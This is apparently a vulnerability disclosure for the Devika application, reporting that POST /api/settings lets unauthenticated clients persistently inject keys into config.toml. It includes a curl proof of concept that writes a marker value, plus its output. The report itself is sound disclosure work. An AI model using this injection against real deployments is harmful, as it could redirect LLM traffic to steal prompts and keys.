# Devika: unauthenticated persistent configuration injection via POST /api/settings

## Description

`POST /api/settings` (devika.py:187-193) accepts arbitrary key/value pairs and writes them into existing sections of `config.toml`, with no authentication and no key whitelist. Injected configuration survives restarts.

## Impact

An unauthenticated client can persistently tamper with server configuration: rewrite `API_ENDPOINTS` (redirect LLM traffic to an attacker-controlled relay to steal prompts/keys), change storage paths, and more — all persistent across restarts.

## PoC

```bash
curl -X POST "http://127.0.0.1:1337/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"STORAGE": {"REPRO_INJECTED_KEY": "pwned-marker"}}'

# Verify persistence:
grep REPRO_INJECTED_KEY config.toml
```

## Execution result

```
$ curl -X POST .../api/settings -d '{"STORAGE": {"REPRO_INJECTED_KEY": "pwned-marker"}}'
[HTTP 200]

$ grep REPRO_INJECTED_KEY config.toml
8:REPRO_INJECTED_KEY = "pwned-marker"
```
